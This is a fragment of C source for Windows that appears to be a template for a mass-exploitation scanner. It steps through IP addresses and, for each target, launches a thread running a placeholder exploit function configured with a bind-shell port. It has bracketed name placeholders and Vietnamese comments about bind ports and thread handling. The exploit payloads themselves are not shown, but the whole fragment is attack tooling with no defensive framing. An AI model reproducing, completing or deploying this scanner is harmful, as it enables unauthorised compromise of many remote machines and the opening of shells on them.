    curIP[0]=ipAddress[0];
    curIP[1]=ipAddress[1];
    curIP[2]=ipAddress[2];
    curIP[3]=ipAddress[3];
    printf("Exploit [exploitName]");
	for(i=0; i<MAX_THREADS;i++){
		[Scanner]_IncreaseIP(curIP);
		// Allocate memory for thread data.
		pDataArray[i] = (PthreadData) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,sizeof(threadData));
		if( pDataArray[i] == NULL ){
           // If the array allocation fails, the system is out of memory
           // so there is no point in trying to print an error message.
           // Just terminate execution.
			printf("out of memory!\n");
            ExitProcess(2);
        }
        //init data
        //lưu ý xử lý bindport cho từng exploit
        ipAr2Str(curIP,pDataArray[i]->strIP);
        pDataArray[i]->shellPort=BINDPORT_[exploitName];
        
        hThreadArray[i] = CreateThread( 
            NULL,                   
            0,                        
            exploit_[exploitName],       			// thread function name
            pDataArray[i],          
            0,                      
            &dwThreadIdArray[i]);   
		if (hThreadArray[i] == NULL) {
			printf("Thread %d is not create!\n",i );
        }
        else{
        	printf("Thread %d is create!\n",i );
        }
	}
	//Đợi tất cả các threads được tắt
	WaitForMultipleObjects(MAX_THREADS, hThreadArray, TRUE, INFINITE);
	for(int i=0; i<MAX_THREADS; i++){
        CloseHandle(hThreadArray[i]);
        if(pDataArray[i] != NULL)
        {
            HeapFree(GetProcessHeap(), 0, pDataArray[i]);
            pDataArray[i] = NULL;    // Ensure address is not reused.
        }
    }